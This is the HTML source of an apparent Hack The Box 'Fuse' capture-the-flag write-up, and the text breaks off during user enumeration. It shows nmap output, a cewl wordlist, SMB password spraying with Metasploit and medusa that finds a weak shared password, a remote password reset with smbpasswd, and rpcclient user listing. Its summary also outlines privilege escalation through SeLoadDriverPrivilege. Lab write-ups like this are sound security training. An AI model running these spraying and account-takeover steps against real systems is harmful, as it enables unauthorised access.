@@ -1,0 +1,749 @@
+<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <script type="text/javascript" src="/scripts/lightbox/lightbox.js"></script><link rel="stylesheet" href="/scripts/lightbox/lightbox.css"> <script src="https://cdn.onesignal.com/sdks/OneSignalSDK.js" async=""></script> <script> var OneSignal = window.OneSignal || []; OneSignal.push(function() { OneSignal.init({ appId: "7174cacd-26ac-4796-aa89-4928af4847f1", }); }); </script><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><meta name="description" content="Got few usernames from the files from the website itself and making a custom wordlist from the website itself using cewl . Password Sparying using metasploit on the smb protocol , Got the correct username and password . Changed the password using smbpasswd and login to the rpcclient. Enumerating about printers . Got a password from the result , Again password sparying using crackmapexec on the winrm protocol got the username associated with it .Logged in using evil-winrm . The user is privileged to load the drivers as , And following an article compiling the necessary files using visual-studio and exploiting the SeLoadDriverPrivilege to get shell as administartor." /><meta property="og:title" content="Hackthebox Fuse writeup" /><meta property="og:description" content="Got few usernames from the files from the website itself and making a custom wordlist from the website itself using cewl . Password Sparying using metasploit on the smb protocol , Got the correct username and password . Changed the password using smbpasswd and login to the rpcclient. Enumerating about printers . Got a password from the result , Again password sparying using crackmapexec on the winrm protocol got the username associated with it .Logged in using evil-winrm . The user is privileged to load the drivers as , And following an article compiling the necessary files using visual-studio and exploiting the SeLoadDriverPrivilege to get shell as administartor." /><meta property="og:image" content="https://0xprashant.github.io/hackthebox/fuse/fuse.png"><meta name="twitter:card" content="summary_large_image"><meta name="twitter:site" content="@0xprashant"><meta property="twitter:title" content="Hackthebox Fuse writeup"><meta name="twitter:creator" content="@0xprashant"><meta name="twitter:description" content="Got few usernames from the files from the website itself and making a custom wordlist from the website itself using cewl . Password Sparying using metasploit on the smb protocol , Got the correct username and password . Changed the password using smbpasswd and login to the rpcclient. Enumerating about printers . Got a password from the result , Again password sparying using crackmapexec on the winrm protocol got the username associated with it .Logged in using evil-winrm . The user is privileged to load the drivers as , And following an article compiling the necessary files using visual-studio and exploiting the SeLoadDriverPrivilege to get shell as administartor."><meta name="twitter:image" content="https://0xprashant.github.io/hackthebox/fuse/fuse.png"><title>Hackthebox Fuse writeup | 0xPrashant</title><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="preload" as="style" href="/assets/css/post.css"><link rel="stylesheet" href="/assets/css/post.css"><link rel="preload" as="style" href="/assets/css/lib/bootstrap-toc.min.css"><link rel="stylesheet" href="/assets/css/lib/bootstrap-toc.min.css" /> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script async src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script async src="/assets/js/post.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column"><div id="nav-wrapper"><div id="profile-wrapper" class="d-flex flex-column"><div id="avatar" class="d-flex justify-content-center"> <a href="/" alt="avatar"> <img src="/assets/img/sample/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="profile-text mt-3"><div class="site-title"> <a href="/">0xPrashant</a></div><div class="site-subtitle font-italic">InfoSec/Cybersec Blog And Writeups</div></div></div><ul class="nav flex-column"><li class="nav-item d-flex justify-content-center "> <a href="/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/categories/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/tags/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/archives/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item d-flex justify-content-center "> <a href="/tabs/about/" class="nav-link d-flex justify-content-center align-items-center w-100"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul></div><div class="sidebar-bottom d-flex flex-wrap justify-content-around mt-4"> <a href="https://www.hackthebox.eu/home/users/profile/84820" target="_blank"></i> <i class="fas fa-cube"></i> </a> <a href="https://github.com/0xprashant" target="_blank"> <i class="fab fa-github"></i> </a> <a href="https://discordapp.com/users/476931503981592607" target="_blank"> <i class="fab fa-discord"></i> </a> <a href="https://twitter.com/0xprashant" target="_blank"> <i class="fab fa-twitter"></i> </a> <a href="https://linkedin.com/in/prashant-saini-8a7a1a162" target="_blank"> <i class="fab fa-linkedin"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Hackthebox Fuse writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Hackthebox Fuse writeup</h1><div class="post-meta text-muted d-flex flex-column"><div> Posted <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Tue, Jun 16, 2020, 12:00 AM +0800" > Jun 16 <i class="unloaded">2020-06-16T00:00:00+08:00</i> </span> by <span class="author"> Prashant Saini </span></div></div><div class="post-content"> <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/fuse/fuse.png" class="post-preview-img"><h1 id="introductionfuse">Introduction@Fuse:~$</h1><div class="table-wrapper"><table><thead><tr><th>Column<th>Details<tbody><tr><td>Name<td>Fuse<tr><td>IP<td>10.10.10.193<tr><td>Points<td>30<tr><td>Os<td>Windows<tr><td>Difficulty<td>Medium<tr><td>Creator<td><a href="https://www.hackthebox.eu/home/users/profile/1190" target="_blank">aas</a><tr><td>Out On<td>13 June 2020</table></div><h1 id="brieffuse">Brief@Fuse:~$</h1><p>Got few usernames from the files from the <code class="language-plaintext highlighter-rouge">website</code> itself and making a custom <code class="language-plaintext highlighter-rouge">wordlist</code> from the website itself using <code class="language-plaintext highlighter-rouge">cewl</code> . <strong>Password</strong> Sparying using <code class="language-plaintext highlighter-rouge">metasploit</code> on the <strong>smb</strong> protocol , Got the correct <strong>username</strong> and <strong>password</strong> . Changed the password using <code class="language-plaintext highlighter-rouge">smbpasswd</code> and login to the <code class="language-plaintext highlighter-rouge">rpcclient</code>. Enumerating about <code class="language-plaintext highlighter-rouge">printers</code> . Got a password from the <code class="language-plaintext highlighter-rouge">result</code> , Again password sparying using <code class="language-plaintext highlighter-rouge">crackmapexec</code> on the <strong>winrm</strong> protocol got the <code class="language-plaintext highlighter-rouge">username</code> associated with it .Logged in using <code class="language-plaintext highlighter-rouge">evil-winrm</code> . The user is privileged to load the drivers as , And following an article compiling the necessary files using <code class="language-plaintext highlighter-rouge">visual-studio</code> and exploiting the <code class="language-plaintext highlighter-rouge">SeLoadDriverPrivilege</code> to get shell as <strong>administartor</strong>.</p><h1 id="summary-">Summary :~$</h1><ul><li>GOt <strong>domain</strong> from <strong>enum4linux</strong><li>Reading the <code class="language-plaintext highlighter-rouge">execl-files</code> got from website<li>Making a <strong>users.txt</strong> file for the <strong>users</strong> got from excel-files<li>making a <code class="language-plaintext highlighter-rouge">custom-wordlist</code> using <strong>cewl</strong> from the <code class="language-plaintext highlighter-rouge">website</code> itself<li><code class="language-plaintext highlighter-rouge">Bruteforce</code> the smb protocol using <strong>metasploit</strong> and <strong>medusa</strong><li>USing <strong>smbpasswd</strong> to reset the password of the user <code class="language-plaintext highlighter-rouge">tlavel</code><li>Enumerating shares<li>Using <code class="language-plaintext highlighter-rouge">rpcclient</code> to enumerate users<li>Got <code class="language-plaintext highlighter-rouge">printer</code> information and a <code class="language-plaintext highlighter-rouge">password</code> from the <strong>enumprinters</strong> query<li>Login as <code class="language-plaintext highlighter-rouge">svc-print</code><li>Got <strong>user.txt</strong><li><strong>Privilege-escalation</strong> by abusing <code class="language-plaintext highlighter-rouge">SeLoadDriverPrivilege</code><li><strong>Compling</strong> all the files<li>Generating a msf <code class="language-plaintext highlighter-rouge">malicious</code> file<li>Creating the registry key as the file <strong>capcom.sys</strong> using <code class="language-plaintext highlighter-rouge">eoploaddriver.exe</code><li>Executing the <strong>ExploitCapcom.exe</strong> to run the <code class="language-plaintext highlighter-rouge">shell.exe</code><li>Got shell as <code class="language-plaintext highlighter-rouge">admin</code><li>Got <strong>root.txt</strong></ul><h1 id="pwned">Pwned</h1><html><head><link rel="stylesheet" type="text/css" href="/asciinema-player.css" /><body> <asciinema-player src="/hackthebox/fuse/4e142027-f031-4da7-a520-af7534092770/fuse.cast" start-at="0" autoplay="1.5" speed="2.0" loop="1" cols="150" rows="20"></asciinema-player> <script src="/asciinema-player.js"></script><h1 id="recon">Recon</h1><h2 id="nmap">Nmap</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+35
+36
+37
+38
+39
+40
+41
+42
+43
+44
+45
+46
+47
+48
+49
+50
+51
+52
+53
+54
+55
+56
+57
+58
+59
+60
+61
+62
+63
+64
+65
+66
+67
+68
+69
+</pre><td class="rouge-code"><pre>➜  fuse nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-v</span> <span class="nt">-T4</span> <span class="nt">-oA</span> scans/nmap.full <span class="nt">-p-</span> fuse.htb
+<span class="c"># Nmap 7.80 scan initiated Sat Jun 13 21:00:25 2020 as: nmap -sV -sC -v -T4 -oA scans/nmap.full -p- fuse.htb</span>
+Nmap scan report <span class="k">for </span>fuse.htb <span class="o">(</span>10.10.10.193<span class="o">)</span>
+Host is up <span class="o">(</span>0.34s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65514 filtered ports
+PORT      STATE SERVICE      VERSION
+53/tcp    open  domain?
+| fingerprint-strings: 
+|   DNSVersionBindReqTCP: 
+|     version
+|_    <span class="nb">bind
+</span>80/tcp    open  http         Microsoft IIS httpd 10.0
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/10.0
+|_http-title: Site doesnt have a title <span class="o">(</span>text/html<span class="o">)</span><span class="nb">.</span>
+88/tcp    open  kerberos-sec Microsoft Windows Kerberos <span class="o">(</span>server <span class="nb">time</span>: 2020-06-14 01:19:23Z<span class="o">)</span>
+135/tcp   open  msrpc        Microsoft Windows RPC
+139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+389/tcp   open  ldap         Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: fabricorp.local, Site: Default-First-Site-Name<span class="o">)</span>
+445/tcp   open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds <span class="o">(</span>workgroup: FABRICORP<span class="o">)</span>
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: fabricorp.local, Site: Default-First-Site-Name<span class="o">)</span>
+3269/tcp  open  tcpwrapped
+5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf       .NET Message Framing
+49666/tcp open  msrpc        Microsoft Windows RPC
+49667/tcp open  msrpc        Microsoft Windows RPC
+49669/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0
+49670/tcp open  msrpc        Microsoft Windows RPC
+49672/tcp open  msrpc        Microsoft Windows RPC
+49690/tcp open  msrpc        Microsoft Windows RPC
+49743/tcp open  msrpc        Microsoft Windows RPC
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port53-TCP:V<span class="o">=</span>7.80%I<span class="o">=</span>7%D<span class="o">=</span>6/13%Time<span class="o">=</span>5EE5780A%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>DNSV
+SF:ersionBindReqTCP,20,<span class="s2">"</span><span class="se">\0\x</span><span class="s2">1e</span><span class="se">\0\x</span><span class="s2">06</span><span class="se">\x</span><span class="s2">81</span><span class="se">\x</span><span class="s2">04</span><span class="se">\0\x</span><span class="s2">01</span><span class="se">\0\0\0\0\0\0\x</span><span class="s2">07version</span><span class="se">\</span><span class="s2">
+SF:x04bind</span><span class="se">\0\0\x</span><span class="s2">10</span><span class="se">\0\x</span><span class="s2">03"</span><span class="o">)</span><span class="p">;</span>
+Service Info: Host: FUSE<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 2h33m10s, deviation: 4h02m31s, median: 13m08s
+| smb-os-discovery: 
+|   OS: Windows Server 2016 Standard 14393 <span class="o">(</span>Windows Server 2016 Standard 6.3<span class="o">)</span>
+|   Computer name: Fuse
+|   NetBIOS computer name: FUSE<span class="se">\x</span>00
+|   Domain name: fabricorp.local
+|   Forest name: fabricorp.local
+|   FQDN: Fuse.fabricorp.local
+|_  System <span class="nb">time</span>: 2020-06-13T18:21:53-07:00
+| smb-security-mode: 
+|   account_used: &lt;blank&gt;
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: required
+| smb2-security-mode: 
+|   2.02: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   <span class="nb">date</span>: 2020-06-14T01:21:55
+|_  start_date: 2020-06-13T19:13:43
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+<span class="c"># Nmap done at Sat Jun 13 21:11:22 2020 -- 1 IP address (1 host up) scanned in 657.60 seconds</span>
+</pre></table></code></div></div><p>So many ports are opened , <code class="language-plaintext highlighter-rouge">interesting</code> ones are <strong>DNS , SMB ,Winrm , HTTP</strong></p><h2 id="port-80-http">Port 80 (HTTP)</h2><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/fuse/4e142027-f031-4da7-a520-af7534092770/image-1.png" alt="Port-80" /></p><p>the <code class="language-plaintext highlighter-rouge">fuse.htb</code> is redirected to <code class="language-plaintext highlighter-rouge">fuse.fabricorp.local</code> …. added it to the <strong>/etc/hosts</strong> file</p><blockquote><p>Fter adding and doing a refresh</p></blockquote><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/fuse/4e142027-f031-4da7-a520-af7534092770/image-2.png" alt="Papercut" /></p><p>There is a <code class="language-plaintext highlighter-rouge">papercut</code> runningb on this <code class="language-plaintext highlighter-rouge">http</code> port . And there are also some <code class="language-plaintext highlighter-rouge">excel</code> files</p><blockquote><p>Download the Excel files</p></blockquote><p>I downloaded all the <code class="language-plaintext highlighter-rouge">three</code> files and opened them</p><blockquote><p>1.</p></blockquote><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/fuse/4e142027-f031-4da7-a520-af7534092770/image-3.png" alt="Excel files" /></p><blockquote><p>2.</p></blockquote><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/fuse/4e142027-f031-4da7-a520-af7534092770/image-4.png" alt="Excel files" /></p><blockquote><p>3.</p></blockquote><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 " data-src="/hackthebox/fuse/4e142027-f031-4da7-a520-af7534092770/image-4.png" alt="Excel file" /></p><p>These files contain some <code class="language-plaintext highlighter-rouge">usernames</code> i just extracted them all and save them in a <code class="language-plaintext highlighter-rouge">users.txt</code></p><h2 id="smb-protocol">SMB Protocol</h2><p>I tried to check if <code class="language-plaintext highlighter-rouge">anonymous</code> login is allowed or not on <strong>smb</strong></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre>➜  prashant smbclient <span class="nt">-L</span> fuse.htb
+Enter WORKGROUP<span class="se">\r</span>oots password: 
+Anonymous login successful
+
+        Sharename       Type      Comment
+        <span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
+SMB1 disabled <span class="nt">--</span> no workgroup available
+</pre></table></code></div></div><p>Okay…so the <code class="language-plaintext highlighter-rouge">anonymous</code> login is allowed but we can not list the shares .</p><h2 id="enum4linux">Enum4linux</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>➜  prashant enum4linux fuse.htb
+Domain Name: FABRICORP                                                                                                                         
+</pre></table></code></div></div><p>Got nothing rather than a <code class="language-plaintext highlighter-rouge">domain-name</code> : <strong>FABRICORP</strong></p><h1 id="password-spraying-on-smb-protocol">Password Spraying on smb protocol</h1><blockquote><p>users.txt</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre>➜  fuse <span class="nb">cat </span>users.txt 
+pmerton
+tlavel
+sthompson
+bhult
+</pre></table></code></div></div><p>These excel-files contain some <code class="language-plaintext highlighter-rouge">usernames</code> i just extracted them all and save them in a <code class="language-plaintext highlighter-rouge">users.txt</code></p><p>Now what ??</p><p>After some time i decided to build a <code class="language-plaintext highlighter-rouge">custom-wordlist</code> from the website using <strong>cewl</strong> so i can bruteforce the login on <code class="language-plaintext highlighter-rouge">smb</code> protocol</p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre><td class="rouge-code"><pre>➜  fuse cewl <span class="nt">-d</span> 5 <span class="nt">-m</span> 3 <span class="nt">-w</span> wordlist http://fuse.fabricorp.local/papercut/logs/html/index.htm <span class="nt">--with-numbers</span> 
+CeWL 5.4.8 <span class="o">(</span>Inclusion<span class="o">)</span> Robin Wood <span class="o">(</span>robin@digi.ninja<span class="o">)</span> <span class="o">(</span>https://digi.ninja/<span class="o">)</span>
+</pre></table></code></div></div><p>i tried <code class="language-plaintext highlighter-rouge">password spraying</code> with the same <strong>users.txt</strong> file using metasploit on the <code class="language-plaintext highlighter-rouge">smb</code> protocol</p><h2 id="using-metasploit">Using metasploit</h2><p>The module i used in msf is <strong><code class="language-plaintext highlighter-rouge">auxiliary/scanner/smb/smb_login</code></strong> to bruteforce the <strong>login</strong></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+</pre><td class="rouge-code"><pre>msf5 <span class="o">&gt;</span> use auxiliary/scanner/smb/smb_login                                                                    
+msf5 auxiliary<span class="o">(</span>scanner/smb/smb_login<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>pass_file wordlist                                 
+pass_file <span class="o">=&gt;</span> wordlist
+msf5 auxiliary<span class="o">(</span>scanner/smb/smb_login<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>USER_file users.txt 
+USER_file <span class="o">=&gt;</span> users.txt   
+msf5 auxiliary<span class="o">(</span>scanner/smb/smb_login<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>RHOSTS fuse.htb                                                                                          
+RHOSTS <span class="o">=&gt;</span> fuse.htb                                                                                                                    
+msf5 auxiliary<span class="o">(</span>scanner/smb/smb_login<span class="o">)</span> <span class="o">&gt;</span>    
+msf5 auxiliary<span class="o">(</span>scanner/smb/smb_login<span class="o">)</span> <span class="o">&gt;</span> run
+
+<span class="o">[</span>+] 10.10.10.193:445      - 10.10.10.193:445 - Success: <span class="s1">'.\tlavel:Fabricorp01'</span>
+<span class="o">[</span>+] 10.10.10.193:445      - 10.10.10.193:445 - Success: <span class="s1">'.\bhult:Fabricorp01'</span>
+</pre></table></code></div></div><h2 id="using-medusa">Using medusa</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre><td class="rouge-code"><pre>➜  fuse medusa <span class="nt">-h</span> fuse.htb <span class="nt">-U</span> users.txt <span class="nt">-P</span> wordlist <span class="nt">-M</span> smbnt 
+
+Medusa v2.2 <span class="o">[</span>http://www.foofus.net] <span class="o">(</span>C<span class="o">)</span> JoMo-Kun / Foofus Networks &lt;jmk@foofus.net&gt;
+
+
+ACCOUNT FOUND: <span class="o">[</span>smbnt] Host: fuse.htb User: tlavel Password: Fabricorp01 <span class="o">[</span>SUCCESS <span class="o">(</span>0x000224:STATUS_PASSWORD_MUST_CHANGE<span class="o">)]</span>
+ACCOUNT FOUND: <span class="o">[</span>smbnt] Host: fuse.htb User: bhult Password: Fabricorp01 <span class="o">[</span>SUCCESS <span class="o">(</span>0x000224:STATUS_PASSWORD_MUST_CHANGE<span class="o">)]</span>
+</pre></table></code></div></div><p>As i can see now that password is <code class="language-plaintext highlighter-rouge">Fabricorp01</code> on which it got <strong>SUCCESS</strong> for both the users <code class="language-plaintext highlighter-rouge">tlavel</code> and <code class="language-plaintext highlighter-rouge">bhult</code> but it also says <code class="language-plaintext highlighter-rouge">STATUS_PASSWORD_MUST_CHANGE</code>.</p><blockquote><p>Login using smbclient</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>➜  fuse smbclient <span class="nt">-L</span> fuse.htb <span class="nt">-U</span> tlavel        
+Enter WORKGROUP<span class="se">\t</span>lavel<span class="s1">'s password: 
+session setup failed: NT_STATUS_LOGON_FAILURE
+</span></pre></table></code></div></div><p>But i got the same error as got previously in <code class="language-plaintext highlighter-rouge">medusa</code></p><p>Well we can reset the <code class="language-plaintext highlighter-rouge">password</code> using <strong>smbpasswd</strong> of a remote machine also if we know its old password…And since i know it so i can simply chnage the password</p><h2 id="changing-smb-password">Changing smb password</h2><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+</pre><td class="rouge-code"><pre>➜  fuse smbpasswd <span class="nt">-r</span> fuse.htb <span class="nt">-U</span> tlavel
+Old SMB password:
+New SMB password:
+Retype new SMB password:
+Password changed <span class="k">for </span>user tlavel on fuse.htb.
+</pre></table></code></div></div><p>And yeah now i can list <code class="language-plaintext highlighter-rouge">shares</code> as user <code class="language-plaintext highlighter-rouge">tlavel</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+</pre><td class="rouge-code"><pre>➜  fuse smbclient <span class="nt">-L</span> fuse.htb <span class="nt">-U</span> tlavel
+Enter WORKGROUP<span class="se">\t</span>lavels password: 
+
+	Sharename       Type      Comment
+	<span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
+	ADMIN<span class="nv">$ </span>         Disk      Remote Admin
+	C<span class="nv">$ </span>             Disk      Default share
+	HP-MFT01        Printer   HP-MFT01
+	IPC<span class="nv">$ </span>           IPC       Remote IPC
+	NETLOGON        Disk      Logon server share 
+	print<span class="nv">$ </span>         Disk      Printer Drivers
+	SYSVOL          Disk      Logon server share 
+SMB1 disabled <span class="nt">--</span> no workgroup available
+</pre></table></code></div></div><p>After <code class="language-plaintext highlighter-rouge">enumerating</code> all the <strong>shares</strong> got nothing actually or i cant figured out thae thing i need.</p><h1 id="enumerating-using-rpcclient">Enumerating using rpcclient</h1><p>I can <code class="language-plaintext highlighter-rouge">reset</code> the password again and login myself to <code class="language-plaintext highlighter-rouge">rpcclient</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+</pre><td class="rouge-code"><pre>➜  fuse rpcclient <span class="nt">-U</span> FABRICORP<span class="se">\\</span>tlavel 10.10.10.193
+Enter FABRICORP<span class="se">\t</span>lavel<span class="s1">'s password: 
+rpcclient $&gt;
+</span></pre></table></code></div></div><blockquote><p>Enum users</p></blockquote><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+</pre><td class="rouge-code"><pre>rpcclient <span class="nv">$&gt;</span> enumdomusers
+user:[Administrator] rid:[0x1f4]
+user:[Guest] rid:[0x1f5]
+user:[krbtgt] rid:[0x1f6]
+user:[DefaultAccount] rid:[0x1f7]
+user:[svc-print] rid:[0x450]
+user:[bnielson] rid:[0x451]
+user:[sthompson] rid:[0x641]
+user:[tlavel] rid:[0x642]
+user:[pmerton] rid:[0x643]
+user:[svc-scan] rid:[0x645]
+user:[bhult] rid:[0x1bbd]
+user:[dandrews] rid:[0x1bbe]
+user:[mberbatov] rid:[0x1db1]
+user:[astein] rid:[0x1db2]
+user:[dmuir] rid:[0x1db3]
+rpcclient <span class="nv">$&gt;</span>
+</pre></table></code></div></div><p>Okay…so i got some <code class="language-plaintext highlighter-rouge">usernames</code> here and i saved them to another file called <code class="language-plaintext highlighter-rouge">users</code></p><div class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
